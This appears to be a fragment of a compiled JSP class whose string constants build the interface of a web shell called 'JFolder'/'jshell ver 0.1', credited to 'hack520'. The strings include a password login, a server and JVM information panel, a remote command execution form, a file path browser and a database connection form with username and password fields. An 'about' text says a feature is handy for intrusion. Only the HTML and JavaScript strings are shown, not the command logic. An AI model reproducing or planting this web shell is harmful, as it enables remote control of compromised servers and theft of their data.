    _jsp_string23 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td colspan=\"2\" align=\"center\">\u5ba2\u6237\u7aef\u4fe1\u606f</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u5ba2\u6237\u673a\u5730\u5740</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string45 = "\"\r\n		onSubmit=\"javascript:selectAllTypes()\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\" width=\"200\">\u5bc6\u7801</td>\r\n		<td><input type=\"text\" size=\"30\" name=\"password\" class=\"textbox\"\r\n			value=\"".toCharArray();
    _jsp_string39 = "\" style=\"width: 150px;\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6570\u636e\u5e93\u7528\u6237\u540d</td>\r\n		<td align=\"center\"><input type=\"text\" name=\"dbUsername\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string12 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u7f51\u7edc\u534f\u8bae</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string22 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u6269\u5c55\u76ee\u5f55\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string16 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JAVA\u865a\u62df\u673a\u7248\u672c</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string37 = "\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\">\u6570\u636e\u5e93\u8fde\u63a5\u7c7b\u578b</td>\r\n		<td align=\"center\"><select name=\"dbType\">\r\n			<option value=\"sqlserver\">SQLServer\u6570\u636e\u5e93</option>\r\n			<option value=\"mysql\">MySql\u6570\u636e\u5e93</option>\r\n			<option value=\"oracle\">Oracle\u6570\u636e\u5e93</option>\r\n			<option value=\"db2\">DB2\u6570\u636e\u5e93</option>\r\n			<option value=\"odbc\">ODBC\u6570\u636e\u6e90</option>\r\n		</select> <script language=\"javascript\">\r\n			for (var i = 0; i < document.dbInfo.dbType.options.length; i ++) {\r\n				if (document.dbInfo.dbType.options[i].value == selectedType) {\r\n					document.dbInfo.dbType.options[i].selected = true;\r\n				}\r\n			}\r\n			</script></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6570\u636e\u5e93\u670d\u52a1\u5668\u5730\u5740</td>\r\n		<td align=\"center\"><input type=\"text\" name=\"dbServer\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string47 = "\" class=\"textbox\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">Session\u8d85\u65f6\u65f6\u95f4</td>\r\n		<td><input type=\"text\" size=\"5\" name=\"sessionTime\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string48 = "\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u53ef\u7f16\u8f91\u6587\u4ef6\u7c7b\u578b</td>\r\n		<td>\r\n		<table border=\"0\" width=\"190\" cellpadding=\"0\" cellspacing=\"0\">\r\n			<tr>\r\n				<td><input type=\"text\" size=\"11\" class=\"textbox\" name=\"newType\" />\r\n				</td>\r\n				<td align=\"center\"><input type=\"button\"\r\n					onClick=\"javascript:delFileType()\" value=\"<<\" class=\" button\" />\r\n				<p></p>\r\n				<input type=\"button\" value=\">>\" onClick=\"javascript:addFileType()\"\r\n					class=\"button\" /></td>\r\n				<td align=\"right\"><select name=\"textFileTypes\" size=\"4\"\r\n					style=\"width: 87px\" multiple=\"true\">\r\n					".toCharArray();
    _jsp_string34 = "\" /> <input type=\"submit\"\r\n			class=\"button\" value=\"\u6267\u884c\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6267\u884c\u7ed3\u679c</td>\r\n	</tr>\r\n	</form>\r\n</table>\r\n<table align=\"center\" width=\"600\" border=\"0\">\r\n	<tr>\r\n		<td>".toCharArray();
    _jsp_string42 = "\" size=\"20\" style=\"width: 150px;\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\" colspan=\"2\"><input type=\"submit\" value=\"\u8fde\u63a5\"\r\n			class=\"button\" />&nbsp;<input type=\"reset\" value=\"\u91cd\u7f6e\" class=\"button\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\" colspan=\"2\">".toCharArray();
    _jsp_string10 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u7a0b\u5e8f\u76f8\u5bf9\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string31 = "\" /> <input\r\n			type=\"submit\" value=\"\u8f6c\u5230\" class=\"button\" /></td>\r\n	</tr>\r\n	</form>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td>".toCharArray();
    _jsp_string6 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u64cd\u4f5c\u7cfb\u7edf</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string15 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JDK\u5b89\u88c5\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string8 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u5f53\u524d\u7528\u6237\u76ee\u5f55</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string38 = "\" style=\"width: 150px;\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6570\u636e\u5e93\u670d\u52a1\u5668\u7aef\u53e3</td>\r\n		<td align=\"center\"><input type=\"text\" name=\"dbPort\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string44 = "\r\n<script language=\"javascript\">\r\n<!--\r\nfunction delFileType() {\r\n	document.config.newType.value = document.config.textFileTypes[document.config.textFileTypes.selectedIndex].value;\r\n	document.config.textFileTypes.options.remove(document.config.textFileTypes.selectedIndex);\r\n}\r\n\r\nfunction addFileType() {\r\n	if (document.config.newType.value != \"\") {\r\n		var oOption = document.createElement(\"OPTION\");\r\n		document.config.textFileTypes.options.add(oOption);\r\n		oOption.value = document.config.newType.value;\r\n		oOption.innerHTML = document.config.newType.value;\r\n	}\r\n}\r\n\r\nfunction selectAllTypes() {\r\n	for (var i = 0; i < document.config.textFileTypes.options.length; i ++) {\r\n		document.config.textFileTypes.options[i].selected = true;\r\n	}\r\n}\r\n//-->\r\n</script>\r\n<table align=\"center\" width=\"600\" border=\"0\" cellpadding=\"2\"\r\n	cellspacing=\"1\" bgcolor=\"#CCCCCC\">\r\n	<form name=\"config\" method=\"post\"\r\n		action=\"".toCharArray();
    _jsp_string28 = "</td>\r\n	</tr>\r\n</table>\r\n".toCharArray();
    _jsp_string43 = "</td>\r\n	</tr>\r\n	</form>\r\n</table>\r\n<table align=\"center\" width=\"100%\" border=\"0\">\r\n	<tr>\r\n		<td align=\"center\">".toCharArray();
    _jsp_string14 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JDK\u7248\u672c</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string26 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u8bf7\u6c42\u65b9\u5f0f</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string24 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u670d\u52a1\u673a\u5668\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string33 = "\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6267\u884c\u547d\u4ee4</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\"><input type=\"text\" class=\"textbox\" size=\"80\"\r\n			name=\"command\" value=\"".toCharArray();
    _jsp_string32 = "\r\n<table border=\"0\" width=\"600\" cellpadding=\"2\" cellspacing=\"1\"\r\n	bgcolor=\"#CCCCCC\" align=\"center\">\r\n	<form name=\"form2\" method=\"post\"\r\n		action=\"".toCharArray();
    _jsp_string7 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u5f53\u524d\u7528\u6237\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string4 = "\r\n<table align=\"center\" width=\"600\" cellpadding=\"2\" cellspacing=\"1\"\r\n	border=\"0\" bgcolor=\"#CCCCCC\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td colspan=\"2\" align=\"center\">\u670d\u52a1\u5668\u4fe1\u606f</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u670d\u52a1\u5668\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string29 = "\r\n<table align=\"center\" width=\"600\" border=\"0\" cellpadding=\"2\"\r\n	cellspacing=\"1\" bgcolor=\"#CCCCCC\">\r\n	<form method=\"post\" name=\"form2\"\r\n		action=\"".toCharArray();
    _jsp_string20 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JAVA\u4e34\u65f6\u76ee\u5f55</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string1 = "\r\n<div align=\"center\"\r\n	style=\"position: absolute; width: 100%; visibility: show; z-index: 0; left: 14px; top: 200px\">\r\n<TABLE class=\"table1\" cellSpacing=\"1\" cellPadding=\"1\" width=\"473\"\r\n	border=\"0\" align=\"center\">\r\n	<tr>\r\n		<td class=\"tr1\">\r\n		<TABLE cellSpacing=\"0\" cellPadding=\"0\" width=\"468\" border=\"0\">\r\n			<tr>\r\n				<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT\r\n					face=\"Verdana, Arial, Helvetica, sans-serif\" color=\"#ffffff\"><b>\u7ba1\u7406\u767b\u5f55\r\n				:::...</b></font></TD>\r\n				<TD align=\"right\"><FONT color=\"#d2d8ec\"><b>JFolder</b>_By_<b>hack520</b></FONT></TD>\r\n			</tr>\r\n			<form name=\"f1\" method=\"post\"><input type=\"hidden\"\r\n				name=\"__EVENTTARGET\" value=\"\" /> <input type=\"hidden\"\r\n				name=\"__EVENTARGUMENT\" value=\"\" /> <input type=\"hidden\"\r\n				name=\"__VIEWSTATE\"\r\n				value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpcGFydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />\r\n			<script language=\"javascript\" type=\"text/javascript\">\r\n<!--\r\n	function __doPostBack(eventTarget, eventArgument) {\r\n		var theform;\r\n		if (window.navigator.appName.toLowerCase().indexOf(\"microsoft\") > -1) {\r\n			theform = document.Form1;\r\n		}\r\n		else {\r\n			theform = document.forms[\"Form1\"];\r\n		}\r\n		theform.__EVENTTARGET.value = eventTarget.split(\"$\").join(\":\");\r\n		theform.__EVENTARGUMENT.value = eventArgument;\r\n		theform.submit();\r\n	}\r\n// -->\r\n</script>\r\n			<tr>\r\n				<td height=\"30\" align=\"center\" class=\"td2\" colspan=\"2\"><input\r\n					name=\"password\" type=\"password\" class=\"textbox\" id=\"Textbox\" /> <input\r\n					type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\"\r\n					title=\"Click here to login\" class=\"button\" /></td>\r\n			</tr>\r\n			</form>\r\n			<SCRIPT type='text/javascript' language='javascript'\r\n				src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>\r\n		</TABLE>\r\n		</td>\r\n	</tr>\r\n</TABLE>\r\n</div>\r\n".toCharArray();
    _jsp_string30 = "\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u5730\u5740&nbsp;&nbsp;<input type=\"text\" size=\"80\"\r\n			name=\"curPath\" class=\"textbox\" value=\"".toCharArray();
    _jsp_string40 = "\" size=\"20\"\r\n			style=\"width: 150px;\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6570\u636e\u5e93\u5bc6\u7801</td>\r\n		<td align=\"center\"><input type=\"password\" name=\"dbPassword\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string50 = "\">".toCharArray();
    _jsp_string21 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JIT\u7f16\u8bd1\u5668\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string54 = "\r\n<table border=\"0\" align=\"center\" width=\"600\" cellpadding=\"2\"\r\n	cellspacing=\"1\" bgcolor=\"#CCCCCC\">\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u5173\u4e8e jshell ver 0.1</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td>&nbsp;&nbsp;&nbsp;&nbsp;\u589e\u52a0\u4e86\u663e\u793aalxea\u6392\u540d\u7684\u529f\u80fd\uff0c\u8fd9\u5bf9\u4e8e\u5165\u4fb5\u4e2d\u4e5f\u6bd4\u8f83\u65b9\u4fbf\u4e9b\uff0c\u7248\u6743\u8fd8\u662f\u5f52\u4f5c\u8005\u7684.</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a>\r\n		and welcome to <a href=\"http://www.77169.com\" target=\"_blank\">\u534e\u590f\u9ed1\u5ba2\u540c\u76df</a></td>\r\n	</tr>\r\n</table>\r\n".toCharArray();
    _jsp_string36 = "\r\n//-->\r\n</script>\r\n<table align=\"center\" width=\"600\" border=\"0\" cellpadding=\"2\"\r\n	cellspacing=\"1\" bgcolor=\"#CCCCCC\">\r\n	<form name=\"dbInfo\" method=\"post\"\r\n		action=\"".toCharArray();
    _jsp_string41 = "\" size=\"20\"\r\n			style=\"width: 150px;\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u6570\u636e\u5e93\u540d</td>\r\n		<td align=\"center\"><input type=\"text\" name=\"dbName\"\r\n			class=\"textbox\" value=\"".toCharArray();
    _jsp_string19 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">JAVA\u8f7d\u5165\u5e93\u641c\u7d22\u8def\u5f84</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string55 = "\r\n</body>\r\n</html>\r\n".toCharArray();
    _jsp_string25 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u7528\u6237\u540d</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string51 = "</option>\r\n					".toCharArray();
    _jsp_string27 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u5e94\u7528\u5b89\u5168\u5957\u63a5\u5b57\u5c42</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string46 = "\" /></td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\">\u7cfb\u7edf\u7f16\u7801</td>\r\n		<td><input type=\"text\" size=\"30\" name=\"encode\"\r\n			value=\"".toCharArray();
    _jsp_string3 = "\r\nvar sAction = document.form1.action;\r\nfor (var i = 0; i < sAction.length; i ++) {\r\n	if (sAction[i].value == action) {\r\n		sAction[i].selected = true;\r\n		//title.innerHTML = \"[\" + sAction[i].innerHTML + \"]\";\r\n	}\r\n}\r\n</script></td>\r\n	</tr>\r\n	</form>\r\n</table>\r\n".toCharArray();
    _jsp_string35 = "\r\n<script language=\"javascript\">\r\n<!--\r\n".toCharArray();
    _jsp_string9 = "</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td width=\"300\" align=\"center\" class=\"datarows\">\u5f53\u524d\u7528\u6237\u5de5\u4f5c\u76ee\u5f55</td>\r\n		<td align=\"center\" class=\"datarows\">".toCharArray();
    _jsp_string49 = "\r\n					<option value=\"".toCharArray();
    _jsp_string52 = "\r\n				</select></td>\r\n			</tr>\r\n		</table>\r\n		</td>\r\n	</tr>\r\n	<tr bgcolor=\"#FFFFFF\">\r\n		<td align=\"center\" colspan=\"2\"><input type=\"submit\" value=\"\u4fdd\u5b58\"\r\n			class=\"button\" /></td>\r\n	</tr>\r\n	</form>\r\n</table>\r\n".toCharArray();
  }
}
